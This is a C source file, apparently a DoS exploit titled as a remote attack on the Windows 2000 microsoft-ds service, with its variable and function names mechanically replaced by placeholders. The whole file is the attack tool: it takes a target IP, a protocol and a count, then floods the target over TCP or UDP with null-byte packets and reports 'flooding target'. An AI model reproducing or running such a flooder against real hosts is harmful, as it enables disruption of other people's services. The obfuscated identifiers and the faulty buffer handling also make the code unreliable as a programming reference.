
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int target ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int nullbuffer ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 unsigned short VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,int) ;
 int FUNC_2 (int) ;
 scalar_t__ FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ,char*,...) ;
 int FUNC_6 (unsigned short) ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (struct sockaddr_in*,int ,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (char*) ;
 scalar_t__ FUNC_12 (int,char*,scalar_t__,int ) ;
 scalar_t__ FUNC_13 (int,char*,scalar_t__,int ,struct sockaddr*,int) ;
 int FUNC_14 (int ,int ,int ) ;
 int VAR_7 ;
 int VAR_8 ;
 scalar_t__ FUNC_15 (char*) ;

int FUNC_16(int VAR_9, char *VAR_10[])
{
        int VAR_11;
 int VAR_12;
 struct sockaddr_in VAR_13;
 unsigned short VAR_14 = VAR_3;
 char *VAR_15;


 FUNC_10("%c[41m", 0x1B);
 FUNC_5(VAR_8, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n");
 FUNC_10("%c[0m", 0x1B);
 FUNC_5(VAR_8, "-----------------------------------------------------------\n");

        if(VAR_9 != 4)
        {
                FUNC_5(VAR_7, "--[ Invalid number of parameters!\n");
                FUNC_5(VAR_7, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", VAR_10[0]);
                FUNC_5(VAR_7, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", VAR_10[0]);
                FUNC_4(-1);
        }

 VAR_15 = (char *) FUNC_7(10*1024*sizeof(char));
 FUNC_1(VAR_15,sizeof(VAR_15));

 FUNC_5(VAR_8, "--[ Starting attack on %s...\n", VAR_10[1]);

 FUNC_8(&VAR_13, 0, sizeof(VAR_13));
 VAR_13.sin_family = VAR_0;
 VAR_13.sin_addr.s_addr = FUNC_11(VAR_10[1]);
 VAR_13.sin_port = FUNC_6(VAR_14);


 if(VAR_10[2][0] == 'U')
 {
  if((VAR_11 = FUNC_14(VAR_4, VAR_5, VAR_2)) < 0)
  {
   FUNC_9("socket() failed ");
   FUNC_4(-1);
  }

  FUNC_5(VAR_8, "--[ Sending NULL byte string * %d via UDP\n", FUNC_0(VAR_10[3]));

  for(VAR_12=0;VAR_12<FUNC_0(VAR_10[3]);VAR_12++)
  {
      if(FUNC_13(VAR_11, VAR_15, FUNC_15(VAR_15), 0, (struct sockaddr *) &VAR_13, sizeof(VAR_13)) != FUNC_15(VAR_15))
      {
    FUNC_9("sendto() failed ");
    FUNC_4(-1);
      } else { FUNC_10("."); }
  }
  FUNC_2(VAR_11);
  FUNC_10("\n");
 }
  else if(VAR_10[2][0] == 'T')
 {

  FUNC_5(VAR_8, "--[ Connecting and sending NULL byte string * %d...\n", FUNC_0(VAR_10[3]));

  if((VAR_11 = FUNC_14(VAR_4, VAR_6, VAR_1)) < 0)
  {
   FUNC_9("socket() failed ");
   FUNC_4(-1);
  }

  if(FUNC_3(VAR_11, (struct sockaddr *) &VAR_13, sizeof(VAR_13)) < 0)
  {
   FUNC_9("connect() failed ");
   FUNC_4(-1);
  }

  for(VAR_12=0;VAR_12<FUNC_0(VAR_10[3]);VAR_12++)
  {
   if(FUNC_12(VAR_11, VAR_15, FUNC_15(VAR_15), 0) != FUNC_15(VAR_15))
   {
    FUNC_9("send() failed ");
    FUNC_4(-1);
   } else { FUNC_10("."); }

  }
  FUNC_2(VAR_11);
  FUNC_10("\n");
 } else
 {
  FUNC_5(VAR_7, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
  FUNC_4(-1);
 }

 FUNC_5(VAR_8, "--[ Finished flooding target!\n");
 FUNC_5(VAR_8, "--[ http://www.telhack.tk\n");

 return 0;
}
